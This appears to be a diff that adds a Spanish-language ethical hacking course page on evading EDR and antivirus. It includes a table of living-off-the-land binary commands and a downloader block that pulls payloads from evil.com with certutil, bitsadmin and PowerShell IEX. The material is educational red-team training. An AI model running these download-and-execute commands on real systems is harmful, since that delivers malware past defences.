@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unidad 6 - Ethical Hacking 2026</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        h1 { color: #2c3e50; }
+        a { color: #3498db; }
+    </style>
+</head>
+<body>
+    <h1>Unidad 6: Ethical Hacking</h1>
+    <p><a href="../index.html">← Volver al índice</a></p>
+    <hr>
+    <div class="content">
+# Unidad 6: Evasión de Defensas
+
+## Objetivos de Aprendizaje
+
+- **Bypassear** soluciones EDR y antivirus.
+- **Ejecutar** técnicas de ocultación y process injection.
+- **Evadir** análisis forense y antiforense.
+- **Aplicar** principios de OpSec en operaciones de Red Team.
+
+---
+
+## Contenido Teórico
+
+### 6.1 EDR Evasion
+
+Los Endpoint Detection and Response (EDR) monitorizan actividad en endpoints para detectar amenazas. El bypass requiere técnicas especializadas.
+
+#### Living Off the Land Binaries (LOLBins)
+
+Utilizar binarios legítimos del sistema para ejecutar acciones maliciosas.
+
+**Ejemplos comunes**:
+
+| Binary | Función | Comando |
+|--------|---------|---------|
+| certutil | Descargar archivos | `certutil -urlcache -f url outfile` |
+| mshta | Ejecutar HTA | `mshta vbscript:Execute(...)` |
+| regsvr32 | Ejecutar DLL | `regsvr32 /s /n /u /i:file.sct` |
+| rundll32 | Ejecutar DLL | `rundll32 dllname,Export` |
+| wmic | Ejecución remota | `wmic /node:host process call create` |
+| msiexec | Instalar malware | `msiexec /q /i http://malicious.msi` |
+| bitsadmin | Descargar | `bitsadmin /transfer job url dest` |
+| powershell | Múltiples | PowerShell todo |
+
+**Ejemplo de downloader**:
+```bash
+# Con certutil
+certutil -urlcache -f https://evil.com/payload.exe payload.exe
+
+# Con bitsadmin
+bitsadmin /transfer myjob https://evil.com/payload.exe %TEMP%\payload.exe
+
+# Con powershell
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
+```
+
+#### DLL Hijacking
+
+Vulnerabilidad cuando una aplicación busca DLLs en ubicaciones inseguras.
+    </div>
+</body>
+</html>
